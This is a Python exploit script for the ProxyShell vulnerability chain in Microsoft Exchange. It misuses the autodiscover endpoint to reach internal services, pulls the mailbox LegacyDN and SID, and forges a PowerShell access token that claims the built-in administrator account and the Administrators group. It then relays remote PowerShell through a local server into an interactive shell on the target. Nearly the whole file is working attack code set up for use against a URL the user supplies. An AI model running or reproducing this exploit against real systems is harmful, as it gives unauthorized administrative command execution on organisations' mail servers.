#!/usr/bin/env python3

import argparse
import base64
import struct
import random
import string
import requests
import re
import threading
import platform
import xml.etree.cElementTree as ET
from colorama import Fore,init

from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from functools import partial


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""


class PwnServer(BaseHTTPRequestHandler):
    def __init__(self, proxyshell, *args, **kwargs):
        self.proxyshell = proxyshell
        super().__init__(*args, **kwargs)

    def do_POST(self):
        # From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
        powershell_url = f'/powershell/?X-Rps-CAT={self.proxyshell.token}'
        length = int(self.headers['content-length'])
        content_type = self.headers['content-type']
        post_data = self.rfile.read(length).decode()
        post_data = re.sub('<wsa:To>(.*?)</wsa:To>', '<wsa:To>http://127.0.0.1:80/powershell</wsa:To>', post_data)
        post_data = re.sub('<wsman:ResourceURI s:mustUnderstand="true">(.*?)</wsman:ResourceURI>', '<wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>', post_data)

        headers = {
            'Content-Type': content_type
        }

        while True:
            try:
                r = self.proxyshell.post(
                    powershell_url,
                    post_data,
                    headers
                )
                if r.status_code == 200:
                    print_color(Fore.GREEN+'Found correct exchange server : '+r.headers["X-CalculatedBETarget"])
                    break
                else:
                    if 'assigned to any management roles' in r.text:
                        print_color(Fore.RED+'500 is not exchange manage role')
                    print_color(Fore.RED+'Error exchange server : '+r.headers["X-CalculatedBETarget"])

            except Exception as e:
                print_color(Fore.RED+'err : '+e)

        resp = r.content
        self.send_response(r.status_code)
        self.end_headers()
        self.wfile.write(resp)


class ProxyShell:

    def __init__(self, exchange_url, email, verify=False):

        self.email = email
        self.exchange_url = exchange_url if exchange_url.startswith('https://') else f'https://{exchange_url}'
        self.rand_email = f'{rand_string()}@{rand_string()}.{rand_string(3)}'
        self.sid = None
        self.legacydn = None

        self.session = requests.Session()
        self.session.verify = verify
        self.session.headers = {
            'Cookie': f'Email=autodiscover/autodiscover.json?a={self.rand_email}'
        }

    def post(self, endpoint, data, headers={}):

        url = f'{self.exchange_url}/autodiscover/autodiscover.json?a={self.rand_email}{endpoint}'
        r = self.session.post(
            url=url,
            data=data,
            headers=headers,
            proxies={"http": "http://127.0.0.1:8080/","https": "http://127.0.0.1:8080/"},
            timeout=60
        )
        return r

    def get_token(self):

        self.token = self.gen_token()

    def get_sid(self):

        data = self.legacydn
        data += '\x00\x00\x00\x00\x00\xe4\x04'
        data += '\x00\x00\x09\x04\x00\x00\x09'
        data += '\x04\x00\x00\x00\x00\x00\x00'

        headers = {
            "X-Requesttype": 'Connect',
            "X-Clientinfo": '{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}',
            "X-Clientapplication": 'Outlook/15.0.4815.1002',
            "X-Requestid": '{C715155F-2BE8-44E0-BD34-2960067874C8}:2',
            'Content-Type': 'application/mapi-http'
        }

        r = self.post(
            '/mapi/emsmdb',
            data,
            headers
        )

        sids = r.text.split("with SID ")[1].split(" and MasterAccountSid")[0]
        print_color(Fore.BLUE+'edit rid on 120 row')
        sids = sids.split('-')
        self.sid = sids[0]+'-'+sids[1]+'-'+sids[2]+'-'+sids[3]+'-'+sids[4]+'-'+sids[5]+'-'+sids[6]+'-'+'500'
        print_color(Fore.BLUE+"if you won't edit rid please change row 122")
        #self.sid = sids

    def get_legacydn(self):

        data = self.autodiscover_body()
        headers = {'Content-Type': 'text/xml'}
        r = self.post(
            '/autodiscover/autodiscover.xml',
            data,
            headers
        )

        autodiscover_xml = ET.fromstring(r.content)
        self.legacydn = autodiscover_xml.find(
            '{*}Response/{*}User/{*}LegacyDN'
        ).text

    def autodiscover_body(self):

        autodiscover = ET.Element(
            'Autodiscover',
            xmlns='http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006'
        )

        request = ET.SubElement(autodiscover, 'Request')
        ET.SubElement(request, 'EMailAddress').text = self.email
        ET.SubElement(request, 'AcceptableResponseSchema').text = 'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a'

        return ET.tostring(
            autodiscover,
            encoding='unicode',
            method='xml'
        )

    def gen_token(self):

        # From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
        version = 0
        ttype = 'Windows'
        compressed = 0
        auth_type = 'Kerberos'
        raw_token = b''
        gsid = 'S-1-5-32-544'

        version_data = b'V' + (1).to_bytes(1, 'little') + (version).to_bytes(1, 'little')
        type_data = b'T' + (len(ttype)).to_bytes(1, 'little') + ttype.encode()
        compress_data = b'C' + (compressed).to_bytes(1, 'little')
        auth_data = b'A' + (len(auth_type)).to_bytes(1, 'little') + auth_type.encode()
        login_data = b'L' + (len(self.email)).to_bytes(1, 'little') + self.email.encode()
        user_data = b'U' + (len(self.sid)).to_bytes(1, 'little') + self.sid.encode()
        group_data = b'G' + struct.pack('<II', 1, 7) + (len(gsid)).to_bytes(1, 'little') + gsid.encode()
        ext_data = b'E' + struct.pack('>I', 0)

        raw_token += version_data
        raw_token += type_data
        raw_token += compress_data
        raw_token += auth_data
        raw_token += login_data
        raw_token += user_data
        raw_token += group_data
        raw_token += ext_data

        data = base64.b64encode(raw_token).decode()

        return data



def rand_string(n=5):

    return ''.join(random.choices(string.ascii_lowercase, k=n))


def exploit(proxyshell):

    proxyshell.get_legacydn()
    print_color(Fore.GREEN+f'LegacyDN: {proxyshell.legacydn}')

    proxyshell.get_sid()
    print_color(Fore.GREEN+f'SID: {proxyshell.sid}')

    proxyshell.get_token()
    print_color(Fore.GREEN+f'Token: {proxyshell.token}')


def start_server(proxyshell, port):

    handler = partial(PwnServer, proxyshell)
    server = ThreadedHTTPServer(('', port), handler)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()


def shell(command, port):

    # From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
    if command.lower() in ['exit', 'quit']:
        exit()

    wsman = WSMan("127.0.0.1", username='', password='', ssl=False, port=port, auth='basic', encryption='never')
    with RunspacePool(wsman) as pool:
        ps = PowerShell(pool)
        ps.add_script(command)
        output = ps.invoke()

    print_color(Fore.GREEN+"OUTPUT:\n%s" % "\n".join([str(s) for s in output]))
    print_color(Fore.RED+"ERROR:\n%s" % "\n".join([str(s) for s in ps.streams.error]))


def get_args():

    parser = argparse.ArgumentParser(description='ProxyShell example')
    parser.add_argument('-u', help='Exchange URL', required=True)
    parser.add_argument('-e', help='Email address', required=True)
    parser.add_argument('-p', help='Local wsman port', default=8000, type=int)
    return parser.parse_args()

def print_color(color, mes=""):

    v_system = platform.system()
    if v_system != 'Windows':
        print(color+mes)
    else:
        init(wrap=True)
        print(color+mes)

def main():

    args = get_args()
    exchange_url = args.u
    email = args.e
    local_port = args.p

    proxyshell = ProxyShell(
        exchange_url,
        email
    )

    exploit(proxyshell)
    start_server(proxyshell, local_port)

    while True:
        shell(input('PS> '), local_port)


if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings(
        requests.packages.urllib3.exceptions.InsecureRequestWarning
    )
    main()
